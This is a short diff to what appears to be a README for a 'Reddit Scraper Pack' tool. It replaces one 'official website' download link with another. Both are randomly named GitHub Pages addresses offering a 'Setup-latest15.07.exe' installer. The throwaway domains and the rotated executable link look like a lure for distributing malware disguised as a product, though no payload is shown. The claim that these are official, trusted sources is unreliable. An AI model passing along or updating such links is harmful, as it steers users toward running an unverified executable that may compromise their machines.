@@ -47,6 +47,6 @@ Reddit Scraper Pack allows exporting data in multiple formats, including CSV, JS
 
 For the latest version of Reddit Scraper Pack, please visit the official download page:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This download provides the "Setup-latest15.07.exe" installer along with comprehensive documentation and support resources. Ensure you download only from trusted sources to avoid security risks.
